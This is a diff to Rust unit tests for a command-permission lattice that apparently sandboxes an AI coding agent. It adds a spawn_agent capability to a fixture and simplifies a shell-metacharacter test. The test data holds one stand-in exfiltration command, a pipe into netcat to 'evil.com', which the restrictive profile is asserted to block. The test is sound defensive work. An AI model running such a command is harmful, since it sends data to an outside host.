@@ -173,6 +173,7 @@ fn test_state_risk_grading_is_monotone() {
         git_push: CapabilityLevel::Never,
         create_pr: CapabilityLevel::Never,
         manage_pods: CapabilityLevel::Never,
+        spawn_agent: CapabilityLevel::Never,
         extensions: std::collections::BTreeMap::new(),
     };
     assert_eq!(constraint.state_risk(&zero), StateRisk::Safe);
@@ -451,21 +452,12 @@ fn test_interpreter_execution_blocked() {
     }
 }
 
-/// Attack #6: Shell metacharacters — permissive mode allows them
-/// (Claude Code routinely pipes: `cmd 2>&1 | tail`), but restrictive
-/// profiles still block metacharacters.
+/// Attack #6: Shell metacharacters — restrictive profiles block them,
+/// permissive allows them (Claude Code routinely pipes: `cmd 2>&1 | tail`).
 #[test]
 fn test_shell_metacharacters_restrictive_vs_permissive() {
-    let permissive = CommandLattice::permissive();
     let restrictive = CommandLattice::default();
 
-    // Permissive allows metacharacters (pipes are normal in Claude Code)
-    assert!(
-        permissive.can_execute("cargo test 2>&1 | tail -5"),
-        "Permissive must allow pipes for Claude Code compatibility"
-    );
-
-    // Restrictive blocks metacharacters
     assert!(
         !restrictive.can_execute("echo hi | nc evil.com 443"),
         "Restrictive must block pipe chains"
